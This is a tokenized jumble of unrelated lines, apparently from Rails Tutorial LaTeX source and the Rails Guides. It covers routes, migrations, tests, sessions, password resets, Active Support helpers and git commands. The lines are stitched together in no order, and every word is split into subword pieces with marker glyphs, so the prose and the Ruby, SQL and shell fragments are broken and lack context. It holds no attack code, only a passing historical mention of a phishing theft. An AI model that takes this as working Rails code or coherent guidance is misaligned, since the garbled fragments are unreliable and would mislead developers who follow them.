▁You ▁can ▁achieve ▁this ▁using ▁the ▁`: body `╼ option ▖
▁Defin ing ▁the ▁new ▁token ▁and ▁digest ▁methods ▁using ▁\ k ode { self } ▖
▁We ▁can ▁also ▁go ▁the ▁other ▁way ▁with ▁the ▁\ k ode { join } ▁method :
▁This ▁flash ▁ persistence ▁is ▁a ▁bug ▁in ▁our ▁application , ▁and ▁before ▁proceeding ▁with ▁a ▁fix ▁it ▁is ▁a ▁good ▁idea ▁to ▁write ▁a ▁test ▁catch ing ▁the ▁error .
▁D ue ▁to ▁a ▁change ▁in ▁the ▁ internal s ╼ of ▁` ActiveSupport :: Callbacks `, ▁this ▁is ▁no ▁longer ▁allow ed ▁in ▁Rails ▁4▖1 ▖
▁ Custom i z ing ▁Resource ful ▁Route s
▁The ▁Home ▁page ▁(\ href { http :// localhost :3000/}{/}) ▁with ▁a ▁ proto - feed ▖ ~\ href { http :// railstutorial ▖ org / images / figures / home _ with _ proto _ feed - full ▖ png }{( full ▁size )}
▁We ' ll ▁explor e ▁this ▁subject ▁in ▁more ▁ de p th ▁in ▁Section ~\ ref { sec : user _ validations }, ▁but ▁for ▁now ▁it ' s ▁worth ▁noting ▁that ▁our ▁initial ▁\ k ode { user } ▁object ▁is ▁valid , ▁which ▁we ▁can ▁verify ▁by ▁calling ▁the ▁boolean ▁\ k ode { valid ?}\ ▁method ▁on ▁it :
▁This ▁can ▁be ▁changed ▁by ▁setting ╼` config ▖ assets ▖ cache _ store `:
▁With ▁these ▁scope s , ▁you ▁can ▁use ▁every ▁method ▁previous ly ▁covered ▁such ▁as ▁` where `, ▁` joins ` ▁and ▁` includes ` ▖
▁Instead , ▁we ' ll ▁follow ▁a ▁common ▁Ruby ▁convention ▁by ▁storing ▁the ▁result ▁of ▁\ k ode { User ▖ find \_ by } ▁in ▁an ▁instance ▁variable , ▁which ▁hit s ▁the ▁database ▁the ▁first ▁time ▁but ▁returns ▁the ▁instance ▁variable ▁immediately ▁on ▁subsequent ▁ invocation s
▁This ▁is ▁because ▁Rails ▁automatically ▁infer s ▁from ▁\ k ode { redirect \_ to ▁@ user } ▁that ▁we ▁want ▁to ▁redirect ▁to ▁\ k ode { user \_ url (@ user )} .
▁create ▁app / views / welcome / index ▖ html ▖ erb
▁( The ▁other ▁three ▁links ▁have ▁no ▁options ▁hash , ▁which ▁is ▁fine ▁since ▁it ' s ▁optional ▖)
▁As ▁a ▁ safety ▁ net , ▁we ' ll ▁first ▁write ▁a ▁test ▁to ▁make ▁sure ▁the ▁initial ▁model ▁object ▁is ▁valid .
▁The ▁migration ▁itself ▁consist s ▁of ▁a ▁\ k ode { change } ▁method ▁that ▁determine s ▁the ▁\ line break ▁change ▁to ▁be ▁made ▁to ▁the ▁database .
▁Sometimes ▁you ▁will ▁be ▁as k ed ▁to ▁make ▁some ▁changes ▁to ▁the ▁code ▁you ▁have ╼ already ▁commit ted ▖
▁password :
▁The ▁related ▁\ k ode { print } ▁method ▁does ▁not :
▁The ▁good ▁new s ▁is ▁that , ▁ having ▁go tt en ▁this ▁far , ▁you ' re ▁ready ▁for ▁ al most ▁anything ▁else ▁out ▁there .
▁Contact
▁The ▁result ing ▁page , ▁which ▁by ▁default ▁is ▁the ▁user ' s ▁profile , ▁should ▁in ▁this ▁case ▁be ▁the ▁`` Edit ▁user '' ▁page .
▁#### ▁Link ing ▁to ▁A udi o ▁File s ▁with ▁the ▁` audio _ tag `
▁This ▁is ▁called ▁the ▁' request ▁response ▁c y c le ▖ '
▁ SELECT ▁* ▁FROM ▁clients ▁WHERE ▁( client s ▖ orders _ count ▁ IN ▁( 1, 3 , 5 ) )
▁copie s ▁of ▁the ▁ Software , ▁and ▁to ▁ permit ▁person s ▁to ▁who m ▁the ▁ Software ▁is
▁This ▁may ▁appear ▁straightforward :
▁B oth ▁the ▁` match es ?` ▁method ▁and ▁the ▁ lambda ▁get s ▁the ▁` request ` ▁object ▁as ▁an ▁argument .
▁In ▁the ▁day s ▁before ▁powerful ▁web ▁framework s ▁with ▁full ▁testing ▁cap a b i li t ies , ▁developers ▁ha d ▁to ▁test ▁forms ▁by ▁hand .
▁$ ▁bundle ▁exec ▁rake ▁test ╼ $ ▁git ▁add ▁- A ╼ $ ▁git ▁commit ▁- m ▁" F in is h ▁log ▁in / log ▁out " ╼ $ ▁git ▁ checkout ▁master ╼ $ ▁git ▁merge ▁log - in - log - out
▁This ▁practice ▁is ▁rather ▁cumbersome , ▁and ▁in ▁this ▁section ▁we ▁discuss ▁two ▁ways ▁to ▁eliminate ▁its ▁ n ec ess ity .
▁in ▁Listing ~\ ref { code : user _ spec } .
▁We ▁can ▁run ▁these ▁tests ▁using ▁the ▁\ k ode { rspec } ▁command ▁as ▁usual :
▁ dup ▁= ▁hash ▖ deep _ dup
▁in ▁Listing ~\ ref { code : test _ close _ browser } .
▁* ▁` config ▖ active _ record ▖ partial _ write s ` ▁is ▁a ▁boolean ▁value ▁and ▁control s ▁whether ▁or ▁not ▁partial ▁write s ▁are ▁used ▁( i ▖ e ▖ ▁whether ▁update s ▁only ▁set ▁attributes ▁that ▁are ▁di r t y )▖
▁let (: f ound _ user ) ▁ { ▁User ▖ find _ by ( email : ▁@ user ▖ email ) ▁ }
▁ Technical ly , ▁a ▁user ▁could ▁update ▁their ▁account ▁with ▁an ▁ er r one ous ▁email ▁address ▁using ▁the ▁account ▁settings ▁update ▁feature ▁from ▁Section ~\ ref { sec : updating _ users }, ▁but ▁the ▁current ▁implementation ▁get s ▁us ▁most ▁of ▁the ▁benefit ▁of ▁email ▁ ve r if ic ation ▁without ▁too ▁much ▁work .
▁#### ▁ generating ▁URLs ▁with ▁` url _ for `
▁A ▁migration ▁for ▁account ▁activation ▁( with ▁added ▁index ) .
▁The ▁Help ▁page ▁with ▁HTML ▁structure ▁removed ▖
▁In ▁this ▁chapter , ▁we ▁will ▁complete ▁the ▁ core ▁sample ▁application ▁by ▁adding ▁a ▁so cial ▁layer ▁that ▁allows ▁users ▁to ▁follow ▁( and ▁ unfollow ) ▁other ▁users , ▁result ing ▁in ▁each ▁user ' s ▁Home ▁page ▁display ing ▁a ▁status ▁feed ▁of ▁the ▁followed ▁users ' ▁microposts .
▁These ▁configuration ▁methods ▁are ▁to ▁be ▁called ▁on ▁a ▁` Rails :: Railtie ` ▁object , ▁such ▁as ▁a ▁sub class ▁of ▁` Rails :: Engine ` ▁or ▁` Rails :: Application ` .
▁At ▁this ▁point , ▁you ▁m ight ▁guess ▁that ▁code ▁like
▁6 ▁examples , ▁0 ▁failure s
▁When ever ▁possible , ▁it ' s ▁a ▁good ╼ ▁idea ▁to ▁keep ▁your ▁controllers ▁ s k in n y , ▁as ▁it ▁will ▁make ▁your ▁application ▁a ╼ ▁p le a sure ▁to ▁work ▁with ▁in ▁the ▁long ▁run .
▁It ' s ▁worth ▁noting ▁that ▁we ▁could ▁actually ▁omit ▁the ▁\ k ode { : source } ▁key ▁for ▁\ k ode { followers } ▁in ▁Listing ~\ ref { code : has _ many _ following _ through _ passive _ relationships }, ▁using ▁simply
▁As ▁with ▁RSpec , ▁ Factory ▁Girl ▁defines ▁a ▁domain - specific ▁language ▁in ▁Ruby , ▁in ▁this ▁case ▁special ize d ▁for ▁defin ing ▁Active ▁Record ▁objects .
▁get ▁' こんにちは ', ▁to : ▁' welcome # index '
▁If ▁it ▁cannot ╼ find ▁it , ▁it ▁will ▁look ▁inside ▁the ▁engine .
▁This ▁guide ▁does ▁not ▁document ▁their ▁behavior ▁around ▁those ▁day s ▁for ▁brevity , ▁but ▁it ▁is ▁enough ▁to ▁say ▁that ▁they ▁do ▁what ▁you ▁would ▁expect ▖
▁The ▁Rails ▁routes , ▁with ▁a ▁rule ▁for ▁the ▁Users ▁resource .
▁### ▁B en ch m ar k Helper
▁We ▁can ▁eliminate ▁this ▁duplication ▁as ▁follows :
▁In cidentally , ▁in ▁Listing ~\ ref { code : persistent _ sessions _ test } ▁we ▁could ▁write
▁U pgrading ▁from ▁Rails ▁3▖2 ▁to ▁Rails ▁4▖0
▁A ▁mockup ▁of ▁a ▁user ' s ▁Home ▁page ▁with ▁a ▁status ▁feed ▖ ~\ href { http :// railstutorial ▖ org / images / figures / page _ flow _ home _ page _ feed _ mockup _ bootstrap - full ▖ png }{( full ▁size )}
▁In clu d ing ▁the ▁Sessions ▁helper ▁module ▁into ▁the ▁Application ▁controller .
▁To ▁get ▁the ▁form ▁to ▁render , ▁we ▁need ▁to ▁define ▁an ▁\ k ode {@ user } ▁variable ▁in ▁the ▁ Password ▁Re set s ▁controller ' s ▁\ k ode { edit } ▁action .
▁ RAILS _ ROOT / config / routes ▖ rb ▁# ▁N O
▁The ▁most ▁popular ▁way ▁is ▁to ▁include ▁code ▁from ▁external ▁source s ▁by ▁ iframe s :
▁The ▁users ▁index ▁page ▁with ▁100 ▁sample ▁users .
▁ Updating ▁an ▁existing ▁record ▁will ▁send ▁an ▁SQL ▁` UPDATE ` ▁operation ╼ instead ▖
▁As ▁noted ▁brief ly ▁in ▁the ▁introduction ▁to ▁this ▁section , ▁there ▁is ▁a ▁d ed icated ▁test ▁database , ▁\ k ode { db / test ▖ sqlite 3 }, ▁for ▁this ▁purpose .
▁ { a : ▁1, ▁b : ▁2, ▁c : ▁3 } ▖ s li ce (: a , ▁: c )
▁**` Rack :: Runtime ` **
▁# ▁do ▁process ▁ video
▁is ▁itself ▁a ▁hash :
▁L oo k ing ▁at ▁the ▁HTML ▁source ▁for ▁Figure ~\ ref { fig : edit _ page }, ▁we ▁see ▁a ▁form ▁tag ▁as ▁expected , ▁as ▁in ▁Listing ~\ ref { code : edit _ form _ html } ▁( s l ight ▁details ▁may ▁differ ) .
▁in ▁Listing ~\ ref { code : gemfile _ rspec } .
▁When ▁developing ▁an ▁application , ▁often ▁code ▁will ▁start ▁to ▁`` s me ll '' , ▁meaning ▁that ▁it ▁get s ▁ugly , ▁ blo at ed , ▁or ▁ filled ▁with ▁repetition .
▁As ▁a ▁rule ▁of ▁thumb , ▁do ▁not ▁document ▁ singleton s ▁unless ▁ absolute ly ▁necessary ▖
▁# ▁The ▁constant ▁M ▁exists ▁now ▁again , ▁and ▁it ▁store s ▁a ▁module
▁The ▁result ▁appears ▁in ▁Listing ~\ ref { code : password _ reset _ test }
▁╼╼ Initial ▁commit
▁TIP : ▁Some ▁engines ▁choose ▁to ▁use ▁this ▁file ▁to ▁put ▁ global ▁configuration ▁options ╼ for ▁their ▁engine ▖
▁FROM ▁" orders "
▁I ▁a m ▁current ly ▁working ▁with ▁ Engine ▁ Y ar d ▁to ▁create ▁links ▁to ▁specific ▁versions ▁of ▁the ▁Rails ▁In st all er .
▁We ' ll ▁put ▁this ▁ mixin ▁to ▁use ▁again ▁in ▁Section ~\ ref { sec : using _ form _ for } .
▁validates ▁: name , ▁length : ▁ { ▁ minimum : ▁2 ▁ }
▁A ▁Rake ▁task ▁for ▁ po p ul ating ▁the ▁database ▁with ▁sample ▁users .
▁In ▁fact , ▁you ▁ probably ▁should n ' t ▁both er ▁with ▁this ▁step ▁right ▁now ; ▁using ▁the ▁default ▁address ▁supplied ▁by ▁Heroku ▁is ▁fine .
▁The ▁analogous ▁command ▁for ▁making ▁a ▁model ▁is ▁\ k ode { generate ▁model }, ▁which ▁we ▁can ▁use ▁to ▁generate ▁a ▁User ▁model ▁with ▁\ k ode { name } ▁and ▁\ k ode { email } ▁attributes , ▁as ▁show n ▁in ▁Listing ~\ ref { code : generate _ user _ model } .
▁### ▁ Adding ▁a ▁Route ▁for ▁ Comments
▁The ▁key ▁line ▁here ▁is
▁The ▁( ra the r ▁ subtle ) ▁ ge ar ▁ icon ▁in ▁the ▁file ▁ navigator ▁pa ne .
▁* ▁With ▁the ▁ Asset ▁Pipeline ▁the ▁: cache ▁and ▁: concat ▁options ▁are n ' t ▁used ▁any more , ▁delete ▁these ▁options ▁from ▁your ▁views .
▁So , ▁in ▁this ▁case , ▁the ▁route r ▁would ▁no ▁longer ▁match ▁` / photos /1 ` ▁to ▁this ▁route ▖
▁> > ▁Rails ▖ env ▖ production ?
▁In ▁this ▁case , ▁` params ` ▁would ▁be ▁` { ▁controller : ▁' photos ', ▁action : ▁' show ', ▁id : ▁'1' , ▁user _ id : ▁' 2 ' ▁}` .
▁App ly ing ▁these ▁changes ▁gives ▁much ▁more ▁ compact ▁tests ▁for ▁the ▁Home ▁page :
▁ ╼ * = ▁require _ self
▁We ▁use ▁the ▁` create ` ▁method ▁on ▁`@ article ▖ comments ` ▁to ▁create ▁and ╼ save ▁the ▁comment ▖
▁#### ▁` to _ options ` ▁and ▁` to _ options !
▁in ▁Listing ~\ ref { code : gem r c } .
▁Rails ▁add s ▁other ▁helpers , ▁too :
▁We ▁can ▁accomplish ▁this ▁in ▁Rails ▁with ▁the ▁\ k ode { form \_ for } ▁helper ▁method , ▁which ▁take s ▁in ▁an ▁Active ▁Record ▁object ▁and ▁construct s ▁a ▁form ▁using ▁the ▁object ' s ▁attributes .
▁With ▁the ▁code ▁as ▁above , ▁the ▁result ▁of ▁destroying ▁the ▁second - most ▁ recent ▁post ▁appears ▁in ▁Figure ~\ ref { fig : home _ post _ delete } .
▁Call ing ▁` logout _ path ` ▁will ▁return ▁` / ex it `
▁# ▁=> ▁nil
▁xml ▖ a (" A ▁Link ", ▁" href " ▁=> ▁" http :// rubyonrails ▖ org ")
▁@ comment ▁= ▁@ article ▖ comments ▖ create ( comment _ params )
▁* ▁` auto b uffer : ▁true `, ▁the ▁ audio ▁will ▁pre ▁load ▁the ▁file ▁for ▁the ▁user ▁on ▁page ▁load .
▁For ▁a ▁small ▁example ▁like ▁this , ▁there ' s ▁not ▁much ▁saving s , ▁but ▁if ▁there ▁are ▁lot s ▁of ▁things ▁to ▁escape ▁it ▁can ▁be ▁a ▁real ▁help :
▁To ▁make ▁the ▁password ▁digest , ▁\ k ode { has \_ secure \_ password } ▁uses ▁a ▁state - of - the - ar t ▁hash ▁function ▁called ▁\ href { http :// en ▖ w ikipedia ▖ org / wiki / B crypt } { bcrypt } .
▁In ▁current ▁versions ▁of ▁Rails , ▁you ▁can ▁abstract ▁a way ▁this ▁implementation ▁detail ▁by ▁using ▁` t ▖ references ▁: supplier ` ▁instead .
▁In ▁this ▁section , ▁we ' ll ▁take ▁the ▁first ▁step ▁toward ▁ persistent ▁sessions ▁by ▁ generating ▁a ▁\ emph { remember ▁token } ▁appropriate ▁for ▁creating ▁ permanent ▁cookies ▁using ▁the ▁\ k ode { cookies } ▁method , ▁together ▁with ▁a ▁secure ▁\ emph { remember ▁digest } ▁for ▁ authenticating ▁those ▁token s .
▁"#{ first _ name ▖ first } ▖ ▁# { last _ name } "
▁We ▁are ▁now ▁ nearly ▁in ▁a ▁position ▁to ▁understand ▁this .
▁Now ▁we ▁are ▁in ▁a ▁position ▁to ▁create ▁microposts ▁in ▁the ▁same ▁way ▁we ▁created ▁users ▁in ▁Section ~\ ref { sec : a _ user _ tour } .
▁T hanks ▁to ▁running ▁\ k ode { rails ▁new } ▁in ▁Section ~\ ref { sec : the _ hello _ application } ▁and ▁\ k ode { bundle ▁install } ▁in ▁Section ~\ ref { sec : bundler }, ▁we ▁already ▁have ▁an ▁application ▁we ▁can ▁run --- but ▁how ?
▁An ▁easy ▁way ▁to ╼ provide ▁this ▁access ▁is ▁to ▁change ▁the ▁engine ' s ▁scope d ▁` Application Controller ` ▁to ╼ in her it ▁from ▁the ▁main ▁application ' s ▁` Application Controller ` ▖
▁This ▁hierarchy ▁is ▁illustrate d ▁in ▁Figure ~\ ref { fig : word _ inheritance _ ruby _ 1 _ 9 } .
▁This ▁will ▁help ▁you ▁with ▁the ▁creation ▁of ▁new ▁files ▁and ▁changes ▁of ▁old ▁files ▁in ▁an ╼ in ter active ▁session .
▁# ▁For ce ▁all ▁access ▁to ▁the ▁app ▁over ▁SSL , ▁use ▁ Strict - Transport - Security ,
▁The ▁other ▁new ▁idea ▁is ▁the ▁\ k ode { pluralize } ▁text ▁helper .
▁\ k ode { f ▖ object } ▁is ▁\ k ode {@ user }, ▁and ▁in
▁Create ▁a ▁random ▁string ▁of ▁di git s ▁for ▁use ▁as ▁a ▁remember ▁token .
▁Logging ▁a ▁user ▁in ▁is ▁simple ▁with ▁the ▁help ▁of ▁the ▁\ k ode { session } ▁method ▁defined ▁by ▁Rails .
▁# ▁config ▖ mock _ with ▁: f le x mock
▁------------ ----------------
▁can ▁be ▁re written ▁in ▁a ▁single ▁line :
▁has _ many ▁: orders , ▁-> ▁ { ▁where ▁processed : ▁true ▁ }
▁module ▁ActiveRecord
▁xml ▖ title (@ feed _ title )
▁class ▁Person ▁< ▁ActiveRecord :: Base
▁$ ▁bundle ▁exec ▁rake ▁test ╼ 2 ▁tests , ▁2 ▁assertions , ▁0 ▁failure s , ▁0 ▁errors , ▁0 ▁skip s
▁### ▁` acceptance `
▁To ▁get ▁started , ▁we ▁first ▁generate ▁an ▁integration ▁test ▁file ▁for ▁ signing ▁up ▁users , ▁which ▁we ' ll ▁call ▁\ k ode { users \_ signup } ▁( a do p ting ▁the ▁controller ▁convention ▁of ▁a ▁plural ▁resource ▁name ) :
▁For ▁example , ▁if ▁your ▁application ▁includes ▁assemblies ▁and ▁parts , ▁with ▁each ▁ assembly ▁ having ▁many ▁parts ▁and ▁each ▁part ▁appear ing ▁in ▁many ▁assemblies , ▁you ▁could ▁declare ▁the ▁models ▁this ▁way :
▁Because ▁of ▁that , ▁` explain ` ▁actually ╼ ex ec ute s ▁the ▁query , ▁and ▁then ▁as k s ▁for ▁the ▁query ▁plan s ▖
▁The ▁result ing ▁\ k ode {@ user } ▁variable ▁definition ▁appears ▁in ▁Listing ~\ ref { code : new _ action _ with _ user } .
▁P utting ▁the ▁ embedded ▁Ruby ▁discuss ed ▁above ▁into ▁the ▁site ▁layout ▁lead s ▁to ▁the ▁code ▁in ▁Listing ~\ ref { code : layout _ flash } .
▁\ href { http :// www ▖ code school ▖ com /}{ Code ▁School } : ▁In ter active ▁programming ▁course s
▁=> ▁Application Controller
▁Rails :: Server ▖ new ▖ t a p ▁do ▁| server |
▁xml ▖ title ( item _ title ( item ) )
▁ Example
▁That ' s ▁a ▁ got cha , ▁for ▁example ▁the ▁root ▁element ▁of ▁the ▁list ▁of ▁ contributors ▁above ▁would ▁not ▁be ▁" contributors " ▁if ▁the ▁collection ▁was ▁empty , ▁but ▁" nil - classes "▖
▁This ▁resource ful ▁route :
▁If ▁you ▁now ▁try ▁ signing ▁up ▁as ▁a ▁new ▁user , ▁you ▁should ▁be ▁ redirected ▁as ▁show n ▁in ▁Figure ~\ ref { fig : redirected _ not _ activated }, ▁and ▁an ▁email ▁like ▁the ▁one ▁show n ▁in ▁Listing ~\ ref { code : account _ activation _ email } ▁should ▁be ▁generated .
▁With ▁these ▁declaration s , ▁as k ing ▁for ▁the ▁value ▁of ▁`@ customer ▖ orders ▖ size ` ▁requires ▁making ▁a ▁call ▁to ▁the ▁database ▁to ▁perform ▁a ▁` C O U N T (* ) ` ▁query ▖
▁We ▁can ▁then ▁use ▁this ▁variable ▁in ▁any ▁of ▁the ▁\ text tt { before } ▁or ▁\ text tt { it } ▁blocks ▁throughout ▁the ▁rest ▁of ▁the ▁test ▖ ▁One ▁advantage ▁of ▁\ text tt { let } ▁is ▁that ▁it ▁\ emph { me m o ize s } ▁its ▁value , ▁which ▁means ▁that ▁it ▁remember s ▁the ▁value ▁from ▁one ▁ invocation ▁to ▁the ▁next .
▁default _ scope ▁ { ▁where (" remove d _ at ▁ IS ▁NULL ") ▁ }
▁X ▁# ▁=> ▁: in _ M
▁The ▁latter ▁is ▁responsib le ▁for ▁creating ╼ the ▁database ▁structure , ▁which ▁is ▁what ▁we ' ll ▁look ▁at ▁next .
▁Change ▁the ▁content ▁of ▁the ▁\ k ode { hello } ▁action ▁in ▁Listing ~\ ref { code : hello _ action } ▁to ▁read ▁`` hola , ▁ mundo !'' ▁instead ▁of ▁`` hello , ▁world !'' .
▁won ' t ▁be ▁inserted ▁into ▁production ▁applications ▁or ▁tests .
▁get s ▁all ▁of ▁the ▁current ▁password ▁tests ▁to ▁pass , ▁and ▁it ▁does ▁a ▁lot ▁more ▁be side s .
▁class : ▁" nav _ bar " ▁%>
▁The ▁result ▁is ▁the ▁best ▁of ▁both ▁world s : ▁convenience ▁in ▁development ▁and ▁e f fi ci en c y ▁in ▁production .
▁# ▁Let ' s ▁define ▁a ▁module ▁called ▁" M " ▁again .
▁I ▁shall ▁be ▁late !" ▖ truncate _ words ( 3 , ▁ separator : ▁' ! ')
▁Active ▁Support ▁add s ▁` missing _ name ?` ▁to ▁` NameError `, ▁which ▁tests ▁whether ▁the ▁exception ▁was ▁raised ▁because ▁of ▁the ▁name ▁passed ▁as ▁argument .
▁In ▁De ce mb er ▁ 2006 , ▁ 34 , 000 ▁actual ▁user ▁names ▁and ▁passwords ▁were ▁ st ol en ▁in ▁a ▁[ MySpace ▁ ph is h ing ▁attack ]( http :// new s ▖ net craft ▖ com / archive s / 2006 / 10 / 27 / my space _ account s _ com p r o mis ed _ by _ ph is her s ▖ html )▖
▁` assert _ generate s ` ▁ assert s ▁that ▁a ▁particular ▁set ▁of ▁options ▁generate ▁a ▁particular ▁path ▁and ▁can ▁be ▁used ▁with ▁default ▁routes ▁or ▁custom ▁routes ▖
▁The ▁result ▁appears ▁in ▁Listing ~\ ref { code : db _ seed }
▁ Most ▁of ▁the ▁secure ▁password ▁machinery ▁will ▁be ▁implemented ▁using ▁a ▁single ▁Rails ▁method ▁called ▁\ k ode { has \_ secure \_ password }, ▁which ▁we ' ll ▁include ▁in ▁the ▁User ▁model ▁as ▁follows :
▁T hough ▁I ' ve ▁work ed ▁my ▁way ▁through ▁many ▁Rails ▁ books , ▁this ▁is ▁the ▁one ▁that ▁finally ▁made ▁me ▁`` get '' ▁it .
▁ umerate }╼╼ ▁% ▁subsection ▁find ing _ and _ authenticating _ a _ user ▁( end )╼╼ ▁\ subsection { Render ing ▁with ▁a ▁flash ▁message } ▁% ▁( fold )╼ ▁\ label { sec : render ing _ with _ a _ flash _ message }╼╼
▁Fin ally , ▁we ▁want ▁to ▁show ▁a ▁link ▁to ▁the ▁` edit ` ▁action ▁in ▁the ▁list ▁of ▁all ▁the ╼ articles , ▁so ▁let ' s ▁add ▁that ▁now ▁to ▁` app / views / articles / index ▖ html ▖ erb ` ▁to ▁make ╼ it ▁appear ▁next ▁to ▁the ▁" Show " ▁link :
▁#### ▁hidden _ field _ tag
▁ Security , ▁es pecially ▁in ▁web ▁applications , ▁is ▁a ▁br o ad ▁and ▁ detailed ▁are a ▖
▁Now ▁we ▁come ▁to ▁some ▁steps ▁that ▁are ▁necessary ▁each ▁time ▁you ▁create ▁a ▁new ▁\ emph { repository } ▁( some times ▁called ▁a ▁\ emph { repo } ▁for ▁short ) .
▁### ▁Configur ing ▁Generat or s
▁ ╼ ▁* ▁" THE ▁B E ER - W A RE ▁L I C E N SE " ▁( R evi s ion ▁42 ) :
▁In ▁particular , ▁we ' ll ▁arrange ▁for ▁a ▁user ' s ▁microposts ▁to ▁be ▁retrieved ▁in ▁a ▁specific ▁\ emph { order }, ▁and ▁we ' ll ▁also ▁make ▁microposts ▁\ emph { dependent } ▁on ▁users ▁so ▁that ▁they ▁will ▁be ▁automatically ▁destroyed ▁if ▁their ▁ associated ▁user ▁is ▁destroyed .
▁` pluralize ` ▁is ▁a ▁rails ▁helper ▁that ▁take s ▁a ▁number ▁and ▁a ▁string ▁as ▁its ╼ argument s ▖
▁Active ▁Record ▁also ▁allows ▁you ▁to ▁pass ▁in ▁hash ▁conditions ▁which ▁can ▁increase ▁the ▁read ability ▁of ▁your ▁conditions ▁syntax ▖
▁use ▁ActiveRecord :: Connection Adapters :: Connection Management
▁* ▁` config ▖ action _ mailer ▖ smtp _ settings ` ▁allows ▁ detailed ▁configuration ▁for ▁the ▁`: smtp ` ▁ delivery ▁method ▖
▁in ▁Listing ~\ ref { code : hello _ action } ▁and
▁If ▁you ▁want ▁something ╼ different , ▁ en code ▁your ▁content ▁and ▁pass ▁in ▁the ▁ en code d ▁content ▁and ▁encoding ▁in ▁a ╼` Hash ` ▁to ▁the ▁` attachments ` ▁method .
▁< option ▁value =" "></ option >
▁ Adding ▁the ▁Capybara ▁ DSL ▁to ▁the ▁RSpec ▁helper ▁file .
▁For ▁now , ▁we ' re ▁only ▁interested ╼ in ▁` app / models / article ▖ rb ` ▁and ▁` db / migrate / 20 140 1 20 19 17 2 9 _ create _ articles ▖ rb `╼ ( your ▁name ▁could ▁be ▁a ▁bit ▁different )▖
▁<%= ▁render ▁@ users ▁%>
▁To ▁take ▁advantage ▁of ▁the ▁up com ing ▁style ▁elements , ▁we ' ll ▁add ▁some ▁extra ▁elements ▁to ╼ the ▁\ k ode { home ▖ html ▖ erb } ▁view ▁( Listing ~\ ref { code : signup _ button }) .
▁### ▁ Issue ▁a ▁P u ll ▁ Request
▁S h ar ing ▁the ▁local ▁server ▁running ▁on ▁the ▁cloud ▁ workspace .
▁You ▁can ▁specify ▁ uni code ▁character ▁routes ▁directly ▖
▁\ chapter { Fi ll ing ▁in ▁the ▁layout } ▁% ▁( fold )╼\ label { cha : filling _ in _ the _ layout }╼╼ In ▁the ▁process ▁of ▁tak ing ▁a ▁brief ▁to ur ▁of ▁Ruby ▁in ▁Chapter ~\ ref { cha : rails _ flavored _ ruby }, ▁we ▁ learned ▁about ▁including ▁the ▁application ▁stylesheet ▁into ▁the ▁sample ▁application ▁( Section ~\ ref { sec : motivation }), ▁but ▁( as ▁noted ▁in ▁Section ~\ ref { sec : css _ revisited }) ▁the ▁stylesheet ▁doesn ' t ▁yet ▁contain ▁any ▁CSS \ @ ▖ ▁In ▁this ▁chapter , ▁we ' ll ▁start ▁ filling ▁in ▁the ▁custom ▁stylesheet ▁by ▁in c or p or ating ▁a ▁CSS ▁framework ▁into ▁our ▁application , ▁and ▁then ▁we ' ll ▁add ▁some ▁custom ▁style s ▁of ▁our ▁own ▖ \ foot note {
▁To ▁install ▁Bootstrap , ▁we ▁run ▁\ k ode { bundle ▁install } ▁as ▁usual :
▁The ▁data ▁model ▁for ▁password ▁resets ▁is ▁similar ▁to ▁the ▁one ▁used ▁for ▁account ▁activation ▁( Figure ~\ ref { fig : user _ model _ account _ activation }) .
▁Rails ▁look s ▁first ▁in ▁the ▁application ' s ▁( ` test / dummy ` ) ▁` app / views ` ▁directory ▁and ╼ the n ▁in ▁the ▁engine ' s ▁` app / views ` ▁directory ▖
▁{" development "=>{" adapt er "=>" postgresql ", ▁" host "=>" localhost ", ▁" database "=>" my _ database ", ▁" po ol " => 5}}
▁WARNING : ▁Do ▁not ▁simply ▁replace ▁` M ul t i J s on ▖ dump ` ▁and ▁` M ul t i J s on ▖ load ` ▁with ╼` JSON ▖ dump ` ▁and ▁` JSON ▖ load ` ▖
▁Guard ▁m on it or s ▁changes ▁in ▁the ▁file system ▁so ▁that , ▁for ▁example , ▁when ▁we ▁change ▁the ▁\ k ode { static \_ pages \_ spec ▖ rb } ▁file ▁only ▁those ▁tests ▁get ▁run .
▁However , ▁this ▁does ▁not ▁filter ▁all ▁HTML , ▁a ▁few ▁tags ▁will ▁be ▁left ▁( by ▁design ), ▁for ▁example ▁& lt ; a & gt ; :
▁If ▁the ▁second ▁command ▁fails , ▁which ▁some times ▁happens ▁on ▁the ▁cloud ▁IDE ▁for ▁reason s ▁I ▁don ' t ▁understand , ▁try ▁re - running ▁the ▁first ▁\ k ode { curl } ▁command ▁un til ▁the ▁file ▁ download s ▁correctly .
▁Co mp ound ing ▁the ▁problem ▁is ▁the ▁ multi p li c ity ▁of ▁ environments : ▁different ▁operat ing ▁systems , ▁version ▁number s , ▁p references ▁in ▁text ▁editor ▁and ▁in te gr at ed ▁development ▁environment ▁( IDE ), ▁etc .
▁@ new _ assemblies ▁= ▁@ part ▖ assemblies ▖ where (" created _ at ▁> ▁? ", ▁2▖ day s ▖ ago )
▁Running ▁\ k ode { render ▁@ users } ▁automatically ▁calls ▁the ▁\ k ode { \_ user ▖ html ▖ erb } ▁partial ▁on ▁each ▁user ▁in ▁the ▁collection .
▁ Remember , ▁a ▁` render ▁: action ` ▁doesn ' t ▁run ▁any ▁code ▁in ▁the ▁ target ▁action , ▁so ▁not h ing ▁will ▁set ▁up ▁the ▁`@ books ` ▁variable ▁that ▁the ▁` index ` ▁view ▁will ▁ probably ▁require ▖
▁Micropost ▁fixtures .
▁As ▁you ▁m ight ▁suspect ▁by ▁now , ▁the ▁application ▁code ▁uses ▁a ▁before ▁filter , ▁this ▁time ▁to ▁restrict ▁access ▁to ▁the ▁\ k ode { destroy } ▁action ▁to ▁admin s .
▁Object - Relation al ▁M app ing , ▁common ly ▁refer r ed ▁to ▁as ▁its ▁ abb r evi ation ▁ ORM , ▁is ╼ a ▁technique ▁that ▁ connect s ▁the ▁rich ▁objects ▁of ▁an ▁application ▁to ▁table s ▁in ╼ a ▁relation al ▁database ▁manage ment ▁system ▖
▁ ╼ ▁x ▁= ▁x ▁+ ▁1
▁1234567890 ▖ to _ s (: human _ size ) ▁# ▁=> ▁1▖ 15 ▁G B
▁S pe a k ing ▁of ▁which , ▁the ▁test ▁suite ▁should ▁ still ▁be ▁\ passing :
▁In ▁particular , ▁we ' ll ▁re - implement ▁a ▁couple ▁of ▁the ▁RSpec ▁integration ▁tests ▁in ▁Cucumber ▁to ▁see ▁how ▁the ▁two ▁methods ▁compare .
